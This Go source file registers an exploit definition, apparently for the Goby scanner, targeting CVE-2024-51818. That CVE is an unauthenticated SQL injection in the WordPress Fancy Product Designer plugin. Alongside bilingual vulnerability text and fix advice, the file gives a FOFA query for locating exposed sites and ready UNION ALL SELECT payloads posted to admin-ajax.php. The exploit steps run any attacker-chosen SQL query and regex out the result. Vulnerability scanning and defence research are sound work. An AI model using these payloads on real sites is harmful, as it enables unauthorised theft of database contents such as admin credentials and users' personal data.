package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "WordPress Fancy Product Designer Plugin /wp-admin/admin-ajax.php SQL Injection Vulnerability (CVE-2024-51818)",
    "Description": "<p>WordPress Fancy Product Designer is a powerful product customization plugin that allows users to design and personalize products such as T-shirts, mugs, posters, etc., in real-time on the front-end page. It provides rich design tools, including adding and editing text, images, and shapes, and supports various product types and design areas. The plugin also integrates with WooCommerce, enabling users to add customized products directly to the shopping cart, making it an ideal choice for e-commerce websites to achieve personalized customization services. A SQL injection vulnerability exists in specific versions of the Fancy Product Designer plugin due to insufficient escaping and validation of user-supplied parameters, as well as a lack of strict preparation for SQL queries. This allows unauthenticated attackers to manipulate database queries by injecting malicious SQL code, thereby extracting sensitive information such as user data and configuration details.</p>",
    "Product": "Fancy-Product-Designer",
    "Homepage": "https://fancyproductdesigner.com/",
    "DisclosureDate": "2025-01-25",
    "PostTime": "2025-02-05",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"wp-content/plugins/fancy-product-designer\" && body=\"/css/fancy-product.css\"",
    "GobyQuery": "body=\"wp-content/plugins/fancy-product-designer\" && body=\"/css/fancy-product.css\"",
    "Level": "2",
    "Impact": "<p>Unauthenticated remote attackers can exploit this vulnerability to obtain sensitive information from the database (e.g., admin backend passwords, user personal information) and, in high-privilege scenarios, write malicious code to the server, further gaining system-level access, posing a severe security threat.</p>",
    "Recommendation": "<p>1. Disable the exposed interfaces on the internet or set access permissions for the interfaces.2. Upgrade to the secure version provided by the vendor to fix the vulnerability.</p>",
    "References": [
        "https://blog.csdn.net/xc_214/article/details/145298964?spm=1001.2014.3001.5501"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT VERSION(),SELECT USER(),SELECT DATABASE()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT VERSION()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/wp-admin/admin-ajax.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action=fpd_load_product&product_id=1 UNION ALL SELECT CONCAT(0x7e7e7e,MD5({{{rand_int}}}),0x7e7e7e),NULL,NULL,NULL,NULL,NULL,NULL-- -"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{rand_int_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/wp-admin/admin-ajax.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action=fpd_load_product&product_id=1 UNION ALL SELECT CONCAT(0x7e7e7e7e,({{{payload}}}),0x7e7e7e),NULL,NULL,NULL,NULL,NULL,NULL-- -"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~~~([^'][\\s\\S]*?)~~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}action=fpd_load_product&product_id=1*"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2024-51818"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "WordPress Fancy Product Designer 插件 /wp-admin/admin-ajax.php SQL 注入漏洞（CVE-2024-51818）",
            "Product": "Fancy-Product-Designer",
            "Description": "<p>WordPress Fancy Product Designer 是一款功能强大的产品定制插件，允许用户在前端页面实时设计和个性化产品，如T恤、杯子、海报等。它提供丰富的设计工具，包括文本、图像、形状的添加与编辑，并支持多种产品类型和设计区域。该插件还集成了 WooCommerce，方便用户将定制产品直接加入购物车，是电商网站实现个性化定制服务的理想选择。Fancy Product Designer 插件在特定版本中存在 SQL 注入漏洞，原因是未对用户提供的参数进行充分转义和验证，同时缺乏对 SQL 查询的严格准备。这使得未经身份验证的攻击者能够通过注入恶意 SQL 代码来操纵数据库查询，从而提取敏感信息，如用户数据、配置信息等。</p>",
            "Recommendation": "<p>1. 关闭互联网暴露面或为接口设置访问权限。2. 升级至厂商提供的安全版本以修复漏洞。</p>",
            "Impact": "<p>未经身份验证的远程攻击者可以利用此漏洞获取数据库中的敏感信息（例如，管理员后台密码、用户个人信息），甚至在高权限情况下向服务器写入恶意代码，进一步获取服务器系统权限，造成严重的安全威胁。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress Fancy Product Designer Plugin /wp-admin/admin-ajax.php SQL Injection Vulnerability (CVE-2024-51818)",
            "Product": "Fancy-Product-Designer",
            "Description": "<p>WordPress Fancy Product Designer is a powerful product customization plugin that allows users to design and personalize products such as T-shirts, mugs, posters, etc., in real-time on the front-end page. It provides rich design tools, including adding and editing text, images, and shapes, and supports various product types and design areas. The plugin also integrates with WooCommerce, enabling users to add customized products directly to the shopping cart, making it an ideal choice for e-commerce websites to achieve personalized customization services. A SQL injection vulnerability exists in specific versions of the Fancy Product Designer plugin due to insufficient escaping and validation of user-supplied parameters, as well as a lack of strict preparation for SQL queries. This allows unauthenticated attackers to manipulate database queries by injecting malicious SQL code, thereby extracting sensitive information such as user data and configuration details.</p>",
            "Recommendation": "<p>1. Disable the exposed interfaces on the internet or set access permissions for the interfaces.2. Upgrade to the secure version provided by the vendor to fix the vulnerability.</p>",
            "Impact": "<p>Unauthenticated remote attackers can exploit this vulnerability to obtain sensitive information from the database (e.g., admin backend passwords, user personal information) and, in high-privilege scenarios, write malicious code to the server, further gaining system-level access, posing a severe security threat.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/wp-admin/admin-ajax.php",
        "rand_int": "define|variable|{{{rand|int|8}}}",
        "rand_int_md5": "define|md5|{{{rand_int}}}"
    },
    "VariablesOrder": [
        "payload",
        "vulurl",
        "rand_int",
        "rand_int_md5"
    ],
    "EditType": "fast",
    "PocId": "9984"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }